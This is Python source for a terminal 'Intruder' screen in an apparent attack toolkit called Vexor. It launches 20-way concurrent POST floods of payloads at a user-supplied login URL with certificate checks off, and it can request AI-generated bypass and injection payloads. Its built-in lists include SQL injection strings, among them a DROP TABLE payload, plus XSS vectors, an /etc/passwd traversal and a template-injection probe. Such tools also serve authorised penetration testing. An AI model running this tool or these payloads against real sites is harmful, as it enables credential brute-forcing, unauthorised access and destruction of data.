"""
Vexor Intruder Screen — Fixed responsive layout
"""
from textual.app import ComposeResult
from textual.widget import Widget
from textual.widgets import Static, Input, Button, DataTable, Log, TextArea, Select
from textual.containers import Horizontal, Vertical, Container
from textual import work
from textual.reactive import reactive
import asyncio


ATTACK_TYPES = [
    ("sniper", "Sniper — Single position"),
    ("battering_ram", "Battering Ram — All positions"),
    ("pitchfork", "Pitchfork — Parallel payloads"),
    ("cluster_bomb", "Cluster Bomb — All combinations"),
]


class IntruderScreen(Widget):

    DEFAULT_CSS = """
    IntruderScreen {
        background: #0a0a0f;
        padding: 0 1;
        overflow-y: auto;
    }
    .intruder-title {
        height: 2;
        color: #00ffff;
        text-style: bold;
    }
    .config-section {
        border: solid #1a1a2e;
        padding: 1;
        margin-bottom: 1;
        height: auto;
    }
    .template-area {
        height: 6;
        margin-bottom: 1;
    }
    .attack-btn-row {
        height: 3;
        margin-top: 1;
    }
    .payload-section {
        border: solid #ff00ff;
        padding: 1;
        margin-bottom: 1;
        height: 14;
    }
    .payload-area {
        height: 8;
    }
    .payload-btn-col {
        width: 20;
        padding-left: 1;
    }
    .results-table {
        height: 12;
        border: solid #1a1a2e;
        margin-bottom: 1;
    }
    .attack-log {
        height: 6;
        border: solid #1a1a2e;
    }
    """

    attacking = reactive(False)

    def compose(self) -> ComposeResult:
        yield Static(
            "[bold bright_cyan]◈ INTRUDER[/]  [dim]Automated Customized Attacks[/]",
            classes="intruder-title"
        )

        with Container(classes="config-section"):
            yield Static("[bold bright_magenta]Attack Configuration[/]")
            yield Input(placeholder="https://target.com/login", id="intruder-url")
            yield Static("[dim]Request Template (mark positions with §payload§):[/]")
            yield TextArea(
                "POST /login HTTP/1.1\nHost: target.com\n\nusername=§admin§&password=§password§",
                id="request-template",
                classes="template-area"
            )
            with Horizontal(classes="attack-btn-row"):
                yield Select(
                    [(label, val) for val, label in ATTACK_TYPES],
                    id="attack-type",
                    value="sniper"
                )
                yield Button("▶ Start Attack", id="btn-start-attack", classes="success")
                yield Button("■ Stop", id="btn-stop-attack", classes="danger")
                yield Button("🤖 AI Payloads", id="btn-ai-payloads")

        with Container(classes="payload-section"):
            yield Static("[bold bright_magenta]Payloads[/]  [dim](One per line)[/]")
            with Horizontal():
                yield TextArea(
                    "admin\nroot\ntest\nuser\nadministrator",
                    id="payload-list",
                    classes="payload-area"
                )
                with Vertical(classes="payload-btn-col"):
                    yield Button("📂 Load File", id="btn-load-file")
                    yield Button("📚 Built-in", id="btn-builtin")
                    yield Button("🤖 AI Gen", id="btn-ai-generate")

        yield Static("[bold bright_magenta]◈ RESULTS[/]")
        table = DataTable(classes="results-table", id="intruder-results")
        table.add_columns("#", "Payload", "Status", "Length", "Time(ms)", "Interesting")
        yield table

        yield Static("[bold bright_magenta]◈ LOG[/]")
        yield Log(classes="attack-log", id="attack-log")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "btn-start-attack":
            self.start_attack()
        elif event.button.id == "btn-stop-attack":
            self.attacking = False
        elif event.button.id in ("btn-ai-payloads", "btn-ai-generate"):
            self.generate_ai_payloads()

    @work(exclusive=True)
    async def start_attack(self) -> None:
        url = self.query_one("#intruder-url", Input).value
        payloads_text = self.query_one("#payload-list", TextArea).text
        payloads = [p.strip() for p in payloads_text.split('\n') if p.strip()]
        log = self.query_one("#attack-log", Log)
        table = self.query_one("#intruder-results", DataTable)

        if not url or not payloads:
            self.notify("Enter URL and payloads", severity="error")
            return

        # Normalize URL
        if not url.startswith("http"):
            url = f"https://{url}"

        self.attacking = True
        log.write_line(f"[*] Starting attack on {url}")
        log.write_line(f"[*] {len(payloads)} payloads | 20 concurrent workers")

        import httpx
        import time

        # Use semaphore for concurrent requests (20 workers = very fast)
        semaphore = asyncio.Semaphore(20)
        results = []

        async def attack_single(i: int, payload: str):
            async with semaphore:
                if not self.attacking:
                    return
                start = time.time()
                try:
                    async with httpx.AsyncClient(
                        verify=False, timeout=10, follow_redirects=True
                    ) as client:
                        # Try both GET and POST
                        resp = await client.post(
                            url,
                            data={"payload": payload, "username": payload, "password": payload},
                            headers={"User-Agent": "Vexor/1.1 Intruder"}
                        )
                        elapsed = int((time.time() - start) * 1000)
                        interesting = ""

                        # Mark interesting responses
                        if resp.status_code == 200 and len(resp.content) > 100:
                            interesting = "⚠️"
                        if resp.status_code in [302, 301]:
                            interesting = "🔀 Redirect"
                        if elapsed > 3000:
                            interesting = "⏱️ Slow"

                        results.append((i, payload, resp.status_code, len(resp.content), elapsed, interesting))

                        # Add to table immediately
                        table.add_row(
                            str(i + 1),
                            payload[:25],
                            f"[bright_green]{resp.status_code}[/]" if resp.status_code == 200
                            else f"[bright_red]{resp.status_code}[/]",
                            str(len(resp.content)),
                            str(elapsed),
                            interesting
                        )
                except Exception as e:
                    table.add_row(str(i + 1), payload[:25], "ERR", "0", "0", str(e)[:15])

        # Launch all attacks concurrently
        tasks = [attack_single(i, p) for i, p in enumerate(payloads)]
        await asyncio.gather(*tasks, return_exceptions=True)

        # Summary
        if results:
            success = sum(1 for r in results if r[2] == 200)
            log.write_line(f"[+] Done! {len(results)} requests | {success} x 200 OK")
        self.attacking = False

    @work(exclusive=True)
    async def generate_ai_payloads(self) -> None:
        url = self.query_one("#intruder-url", Input).value
        template = self.query_one("#request-template", TextArea).text

        self.notify("Generating context-aware AI payloads...", severity="information")
        try:
            from vexor.ai.client import AIClient
            client = AIClient()

            # Build context-aware prompt
            context = f"URL: {url}\nRequest template: {template[:200]}"

            # Detect what type of payloads are needed from template
            payload_type = "general"
            template_lower = template.lower()
            if "username" in template_lower or "password" in template_lower or "login" in template_lower:
                payload_type = "auth_bypass"
            elif "search" in template_lower or "q=" in template_lower:
                payload_type = "xss"
            elif "id=" in template_lower or "user_id" in template_lower:
                payload_type = "sqli"

            payloads = await client.generate_payloads(
                target=context,
                payload_type=payload_type,
                count=25
            )

            if payloads:
                # Deduplicate
                unique_payloads = list(dict.fromkeys(payloads))
                self.query_one("#payload-list", TextArea).load_text('\n'.join(unique_payloads))
                self.notify(f"Generated {len(unique_payloads)} unique payloads!", severity="information")
            else:
                # Fallback to built-in payloads
                self._load_builtin_payloads(payload_type)
        except Exception as e:
            self.notify(f"AI error: {str(e)[:50]}", severity="error")
            self._load_builtin_payloads("general")

    def _load_builtin_payloads(self, payload_type: str) -> None:
        """Load built-in payloads as fallback"""
        builtin = {
            "auth_bypass": [
                "admin", "administrator", "root", "test", "guest",
                "' OR '1'='1", "' OR 1=1--", "admin'--",
                "admin' #", "' OR 'x'='x", "1' OR '1'='1",
            ],
            "sqli": [
                "'", "''", "' OR 1=1--", "' OR '1'='1",
                "1 UNION SELECT NULL--", "' AND SLEEP(3)--",
                "1; DROP TABLE users--", "' OR 1=1#",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'><script>alert(1)</script>",
            ],
            "general": [
                "' OR 1=1--", "<script>alert(1)</script>",
                "../../../etc/passwd", "{{7*7}}",
                "admin", "password", "test123",
                "' AND SLEEP(3)--", "<img src=x onerror=alert(1)>",
            ],
        }
        payloads = builtin.get(payload_type, builtin["general"])
        self.query_one("#payload-list", TextArea).load_text('\n'.join(payloads))
        self.notify(f"Loaded {len(payloads)} built-in payloads", severity="information")
